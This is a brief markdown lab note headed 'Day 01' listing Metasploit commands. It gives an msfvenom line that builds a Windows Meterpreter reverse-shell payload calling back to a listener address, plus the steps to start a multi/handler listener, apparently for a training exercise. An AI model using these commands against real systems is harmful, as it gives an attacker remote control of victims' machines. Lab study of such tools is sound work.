<div align="center">
  <h1>Day 01</h1>
  <br/>
</div>

##Metasploit commands:
###Shellcode generation:
- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.61.38 LPORT=9999 -f go

###Listener:
- msfconsole
- exploit/multi/handler
- set payload windows/x64/meterpreter/reverse_http
- set LHOST <Kali IP address>
- set LPORT <non-standard port>
- run